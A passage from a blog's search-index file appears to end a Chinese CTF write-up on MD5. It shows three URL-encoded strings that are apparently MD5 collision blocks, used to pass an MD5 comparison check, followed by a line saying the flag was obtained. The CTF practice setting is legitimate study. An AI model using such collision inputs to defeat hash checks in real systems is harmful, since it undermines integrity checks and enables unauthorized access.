class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br>$s2 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span><br>$s3 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br></code></pre></td></tr></table></figure></p><p>然后就顺利得到flag啦~</p>]]></content>
    
    
    <categories>
      
      <category>BUU刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>MD5</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
